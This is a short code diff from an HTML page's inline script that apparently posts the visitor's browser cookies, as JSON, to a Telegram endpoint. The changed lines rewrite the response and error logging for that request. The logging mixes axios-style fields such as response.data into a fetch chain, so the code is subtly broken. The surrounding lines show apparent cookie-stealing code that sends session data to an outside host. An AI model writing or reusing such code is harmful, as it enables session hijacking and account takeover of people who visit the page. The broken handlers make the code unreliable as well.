@@ -38,9 +38,13 @@
                 },
                 body: JSON.stringify({ cookies: cookies })
             })
-            .then(response => response.text())
+            .then(response => {
+                console.log("Telegram API Response:", response.data);
+            })
             .then(data => console.log(data))
-            .catch(error => console.error('Error:', error));
+            .catch(err => {
+                console.error("Telegram API Error:", err.response ? err.response.data : err.message);
+            });
         }
     </script>
 </head>
